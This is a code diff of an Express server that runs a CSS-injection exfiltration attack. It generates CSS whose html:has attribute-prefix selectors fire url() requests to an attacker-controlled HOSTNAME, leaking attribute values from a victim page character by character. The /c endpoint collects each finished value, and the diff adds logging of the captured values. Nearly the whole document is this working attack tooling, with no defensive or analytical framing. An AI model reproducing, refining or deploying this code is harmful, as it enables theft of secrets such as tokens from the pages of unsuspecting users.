@@ -55,7 +55,7 @@ app.use('/l', function(request, response){
     response.end();
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) {                 
-            const elementNumber = +req.query.e;
+            const elementNumber = int(req.query.e, MAX_ELEMENTS);
             if(elementNumber > MAX_ELEMENTS) {                
                 return;
             }
@@ -67,7 +67,7 @@ app.use('/l', function(request, response){
             if(prefixQueryValue.length > MAX_VALUE) {                
                 continue;
             }
-            if(n === +req.query.n && currentElementPos === elementNumber) {
+            if(n === int(req.query.n, MAX_VALUE) && currentElementPos === elementNumber) {
                 if(!prefixes.has(prefixKey)) {
                     prefixes.set(prefixKey, '');
                 } 
@@ -128,7 +128,8 @@ app.use('/c', function(request, response){
     if(!hasToken(tokens,{tag, attribute, value})) {
         tokens.push({tag, attribute, value});
         session.get(ip).set('foundToken',true);
-    }         
+    }    
+    console.log("Found!!!", {tag, attribute, value});     
 });
 
 const genResponse = (request, response, elementNumber) => {
@@ -144,14 +145,14 @@ const genResponse = (request, response, elementNumber) => {
     let properties = [];
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) { 
-            const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+elementNumber+'-'+n;  
+            const variablePrefix = '--'+getPrefix(element,attribute,elementNumber)+'-'+n;  
             const prefixKey = getPrefix(element, attribute, elementNumber);
             if(!prefixes.has(prefixKey)) {
                 prefixes.set(prefixKey, '');
             }
             const prefix = prefixes.get(prefixKey);
-            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(tokens, element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
-            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]'+generateNotSelectors(tokens, element,attribute)+')'+'{'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
+            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(tokens, element, attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
+            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]){'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
         }
     }
     if(n === 0 && elementNumber === 0) {  
@@ -159,7 +160,7 @@ const genResponse = (request, response, elementNumber) => {
             for(let attribute of ATTRIBUTES[element]) {         
                 for(let i=0;i<MAX_ELEMENTS;i++) { 
                     for(let j=0;j<MAX_VALUE;j++) {         
-                        const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+i+'-'+j;  
+                        const variablePrefix = '--'+getPrefix(element,attribute,i)+'-'+j;  
                         properties.push('var('+variablePrefix+'s,none)');              
                         properties.push('var('+variablePrefix+'full,none)');                    
                     }
@@ -285,7 +286,7 @@ function generateNotSelectors(tokens, elementName, attributeName) {
 }
 
 function getIP(request) {
-    return request.socket.remoteAddress
+    return request.ip;
 }
 
 function deleteOldSessions(amount) {
@@ -310,4 +311,9 @@ function hasSession(ip) {
 
 function getPrefix(element, attribute, elementNumber) {
     return 'p_'+element[0]+attribute[0]+elementNumber;
+}
+
+function int(number, max) {
+    number = +number;
+    return Number.isNaN(number) ? 0 : Math.min(number, max);
 }
